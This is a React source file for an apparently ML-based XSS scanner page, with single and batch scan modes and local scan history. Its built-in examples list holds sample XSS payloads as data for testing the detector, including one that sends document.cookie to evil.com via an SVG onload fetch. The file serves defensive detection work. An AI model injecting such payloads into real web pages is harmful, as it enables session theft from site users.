// src/pages/Scanner.jsx
import { useState, useRef } from "react";
import { Shield, Search, Layers, RotateCcw, AlertTriangle, ChevronDown, Info, Clipboard, Zap, X } from "lucide-react";
import { predictSingle, predictBatch } from "../api/client";
import ResultCard from "../components/ResultCard";
import AIPanel from "../components/AIPanel";
import SeverityBadge from "../components/SeverityBadge";

const EXAMPLES = [
  { label: "Classic XSS",  payload: `<script>alert('XSS')</script>` },
  { label: "IMG onerror",  payload: `<img src=x onerror=alert(document.cookie)>` },
  { label: "SVG inject",   payload: `<svg/onload=fetch('https://evil.com?c='+document.cookie)>` },
  { label: "Safe input",   payload: `Hello, my name is Alice and I live in Wonderland.` },
  { label: "Encoded XSS",  payload: `%3Cscript%3Ealert%281%29%3C%2Fscript%3E` },
  { label: "DOM-based",    payload: `javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>` },
];

function saveToHistory(entry) {
  try {
    const existing = JSON.parse(localStorage.getItem("shieldscan_history") || "[]");
    localStorage.setItem("shieldscan_history", JSON.stringify([entry, ...existing].slice(0, 200)));
  } catch {}
}

function SingleScanner() {
  const [payload, setPayload] = useState("");
  const [result, setResult] = useState(null);
  const [latencyMs, setLatencyMs] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [showExamples, setShowExamples] = useState(false);
  const textareaRef = useRef(null);

  const handleScan = async () => {
    if (!payload.trim()) return;
    setLoading(true); setError(null); setResult(null);
    try {
      const res = await predictSingle(payload.trim());
      setResult(res); setLatencyMs(res.latencyMs);
      // ✅ Fixed: use xss_probability for confidence, severity for risk_level
      saveToHistory({
        id: Date.now(),
        timestamp: new Date().toISOString(),
        payload: payload.trim(),
        is_xss: res.is_xss,
        risk_level: (res.severity ?? res.risk_level ?? (res.is_xss ? "high" : "safe")).toLowerCase(),
        confidence: res.xss_probability ?? res.confidence ?? 0,
        mode: "single"
      });
    } catch (e) { setError(e.message); }
    finally { setLoading(false); }
  };

  return (
    <div className="space-y-5">
      <div className="card overflow-hidden">
        <div className="flex items-center justify-between px-5 py-3.5" style={{ borderBottom: "1px solid var(--border)", background: "var(--bg-subtle)" }}>
          <div className="flex items-center gap-2">
            <Shield size={15} style={{ color: "var(--accent)" }} />
            <span className="text-sm font-semibold" style={{ color: "var(--text-primary)" }}>Payload Input</span>
          </div>
          <div className="flex items-center gap-2">
            <button onClick={async () => { try { setPayload(await navigator.clipboard.readText()); } catch {} }}
              className="btn-ghost flex items-center gap-1.5 text-xs px-2.5 py-1">
              <Clipboard size={12} />Paste
            </button>
            <div className="relative">
              <button onClick={() => setShowExamples(p => !p)}
                className="btn-ghost flex items-center gap-1.5 text-xs px-2.5 py-1">
                <Zap size={12} />Examples
                <ChevronDown size={11} className={`transition-transform ${showExamples ? "rotate-180" : ""}`} />
              </button>
              {showExamples && (
                <div className="absolute right-0 top-full mt-1 z-20 w-52 rounded-xl overflow-hidden shadow-xl"
                  style={{ background: "var(--bg-card)", border: "1px solid var(--border)" }}>
                  {EXAMPLES.map(ex => (
                    <button key={ex.label} onClick={() => { setPayload(ex.payload); setShowExamples(false); setResult(null); textareaRef.current?.focus(); }}
                      className="w-full text-left px-3 py-2 text-xs transition-colors"
                      style={{ borderBottom: "1px solid var(--border)", color: "var(--text-secondary)" }}
                      onMouseEnter={e => e.currentTarget.style.background = "var(--bg-subtle)"}
                      onMouseLeave={e => e.currentTarget.style.background = "transparent"}>
                      <span className="font-semibold" style={{ color: "var(--text-primary)" }}>{ex.label}</span>
                      <span className="block font-mono mt-0.5 truncate" style={{ color: "var(--text-muted)" }}>{ex.payload.slice(0, 35)}…</span>
                    </button>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>

        <div className="p-4">
          <textarea ref={textareaRef} value={payload} onChange={e => setPayload(e.target.value)}
            onKeyDown={e => { if ((e.metaKey || e.ctrlKey) && e.key === "Enter") handleScan(); }}
            placeholder="Paste or type a payload to analyze for XSS vulnerabilities..."
            rows={5} className="input-base w-full resize-none text-sm rounded-xl p-3.5 leading-relaxed" />
          <div className="flex items-center justify-between mt-3">
            <div className="flex items-center gap-1.5 text-xs" style={{ color: "var(--text-muted)" }}>
              <Info size={12} />
              {payload.length} chars{payload.length > 0 && " · ⌘↵ to scan"}
            </div>
            <div className="flex items-center gap-2">
              {payload && (
                <button onClick={() => { setPayload(""); setResult(null); setError(null); }}
                  className="flex items-center gap-1.5 text-xs transition-colors" style={{ color: "var(--text-muted)" }}>
                  <RotateCcw size={12} />Clear
                </button>
              )}
              <button onClick={handleScan} disabled={!payload.trim() || loading}
                className="btn-primary flex items-center gap-2 text-sm px-5 py-2">
                {loading
                  ? <><div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />Scanning…</>
                  : <><Search size={15} />Scan Payload</>}
              </button>
            </div>
          </div>
        </div>
      </div>

      {error && (
        <div className="flex items-start gap-2.5 rounded-xl p-4"
          style={{ background: "rgba(239,68,68,0.08)", border: "1px solid rgba(239,68,68,0.2)", color: "#f87171" }}>
          <AlertTriangle size={16} className="shrink-0 mt-0.5" />
          <div><p className="font-semibold text-sm">Scan failed</p><p className="text-sm mt-0.5 opacity-80">{error}</p></div>
        </div>
      )}

      {result && (
        <div className="space-y-4">
          <ResultCard result={result} latencyMs={latencyMs} payload={payload} />
          <AIPanel payload={payload} result={result} />
        </div>
      )}
    </div>
  );
}

function BatchScanner() {
  const [rawInput, setRawInput] = useState("");
  const [results, setResults] = useState(null);
  const [summary, setSummary] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const payloads = rawInput.split("\n").map(l => l.trim()).filter(Boolean);

  const handleScan = async () => {
    if (payloads.length === 0) return;
    setLoading(true); setError(null); setResults(null);
    try {
      const res = await predictBatch(payloads);
      setResults(res.results); setSummary(res.summary);
      // ✅ Fixed: use xss_probability and severity for batch results too
      payloads.forEach((p, i) => {
        const r = res.results?.[i];
        if (r) saveToHistory({
          id: Date.now() + i,
          timestamp: new Date().toISOString(),
          payload: p,
          is_xss: r.is_xss,
          risk_level: (r.severity ?? r.risk_level ?? (r.is_xss ? "high" : "safe")).toLowerCase(),
          confidence: r.xss_probability ?? r.confidence ?? 0,
          mode: "batch"
        });
      });
    } catch (e) { setError(e.message); }
    finally { setLoading(false); }
  };

  return (
    <div className="space-y-5">
      <div className="card overflow-hidden">
        <div className="px-5 py-3.5 flex items-center gap-2"
          style={{ borderBottom: "1px solid var(--border)", background: "var(--bg-subtle)" }}>
          <Layers size={15} style={{ color: "var(--accent)" }} />
          <span className="text-sm font-semibold" style={{ color: "var(--text-primary)" }}>Batch Payloads</span>
          <span className="ml-auto text-xs" style={{ color: "var(--text-muted)" }}>{payloads.length} payloads</span>
        </div>
        <div className="p-4">
          <textarea value={rawInput} onChange={e => setRawInput(e.target.value)}
            placeholder={"One payload per line:\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>"}
            rows={8} className="input-base w-full resize-none text-sm rounded-xl p-3.5 leading-relaxed" />
          <div className="flex justify-end mt-3">
            <button onClick={handleScan} disabled={payloads.length === 0 || loading}
              className="btn-primary flex items-center gap-2 text-sm px-5 py-2">
              {loading
                ? <><div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />Scanning…</>
                : <><Layers size={15} />Scan {payloads.length > 0 ? `${payloads.length} Payloads` : "Batch"}</>}
            </button>
          </div>
        </div>
      </div>

      {error && (
        <div className="flex items-start gap-2.5 rounded-xl p-4"
          style={{ background: "rgba(239,68,68,0.08)", border: "1px solid rgba(239,68,68,0.2)", color: "#f87171" }}>
          <AlertTriangle size={16} className="shrink-0 mt-0.5" /><p className="text-sm">{error}</p>
        </div>
      )}

      {summary && (
        <div className="card p-5 animate-fsu">
          <p className="text-xs font-semibold uppercase tracking-widest mb-4" style={{ color: "var(--text-muted)" }}>Batch Summary</p>
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
            {[
              { label: "Total",          value: summary.total ?? payloads.length,                          color: "var(--text-primary)" },
              { label: "XSS Found",      value: summary.xss_count ?? results?.filter(r => r.is_xss).length, color: "#f87171" },
              { label: "Safe",           value: summary.safe_count ?? results?.filter(r => !r.is_xss).length, color: "#34d399" },
              { label: "Avg Confidence", value: `${Math.round((summary.avg_confidence ?? 0) * 100)}%`,     color: "#a78bfa" },
            ].map(s => (
              <div key={s.label} className="card-subtle p-3 text-center">
                <p className="text-2xl font-bold tabular-nums" style={{ color: s.color }}>{s.value}</p>
                <p className="text-xs mt-0.5" style={{ color: "var(--text-muted)" }}>{s.label}</p>
              </div>
            ))}
          </div>
        </div>
      )}

      {results && results.length > 0 && (
        <div className="card overflow-hidden animate-fsu">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead style={{ background: "var(--bg-subtle)", borderBottom: "1px solid var(--border)" }}>
                <tr>
                  {["#", "Payload", "Status", "Confidence", "Risk"].map(h => (
                    <th key={h} className="text-left px-4 py-3 text-xs font-semibold uppercase tracking-widest"
                      style={{ color: "var(--text-muted)" }}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {results.map((r, i) => (
                  <tr key={i} style={{ borderBottom: "1px solid var(--border)", background: r.is_xss ? "rgba(239,68,68,0.04)" : "transparent" }}>
                    <td className="px-4 py-3 text-xs tabular-nums" style={{ color: "var(--text-muted)" }}>{i + 1}</td>
                    <td className="px-4 py-3 max-w-xs">
                      <code className="text-xs font-mono truncate block" style={{ color: "var(--text-secondary)" }}>{payloads[i]}</code>
                    </td>
                    <td className="px-4 py-3">
                      <span className="text-xs font-bold" style={{ color: r.is_xss ? "#f87171" : "#34d399" }}>
                        {r.is_xss ? "⚠ XSS" : "✓ Safe"}
                      </span>
                    </td>
                    {/* ✅ Fixed: read xss_probability for confidence */}
                    <td className="px-4 py-3 text-xs tabular-nums" style={{ color: "var(--text-secondary)" }}>
                      {Math.round((r.xss_probability ?? r.confidence ?? 0) * 100)}%
                    </td>
                    <td className="px-4 py-3">
                      <SeverityBadge level={(r.severity ?? r.risk_level ?? (r.is_xss ? "high" : "safe")).toLowerCase()} size="sm" />
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}
    </div>
  );
}

export default function Scanner() {
  const [mode, setMode] = useState("single");
  return (
    <div className="max-w-3xl mx-auto px-4 py-8">
      <div className="mb-8">
        <div className="flex items-center gap-2 mb-1">
          <div className="w-8 h-8 rounded-xl flex items-center justify-center" style={{ background: "var(--accent)" }}>
            <Shield size={16} className="text-white" />
          </div>
          <h1 className="text-2xl font-bold" style={{ color: "var(--text-primary)" }}>XSS Scanner</h1>
        </div>
        <p className="text-sm" style={{ color: "var(--text-secondary)" }}>
          Analyze payloads in real-time using the ShieldScan ML model. Get AI-powered explanations and remediation code.
        </p>
      </div>

      <div className="flex items-center gap-1 p-1 rounded-xl w-fit mb-6" style={{ background: "var(--bg-subtle)" }}>
        {[{ id: "single", label: "Single Scan", icon: Search }, { id: "batch", label: "Batch Scan", icon: Layers }].map(({ id, label, icon: Icon }) => (
          <button key={id} onClick={() => setMode(id)}
            className="flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-semibold transition-all"
            style={{
              background: mode === id ? "var(--bg-card)" : "transparent",
              color: mode === id ? "var(--accent)" : "var(--text-muted)",
              border: mode === id ? "1px solid var(--border)" : "1px solid transparent",
              boxShadow: mode === id ? "var(--shadow)" : "none",
            }}>
            <Icon size={14} />{label}
          </button>
        ))}
      </div>

      {mode === "single" ? <SingleScanner /> : <BatchScanner />}
    </div>
  );
}
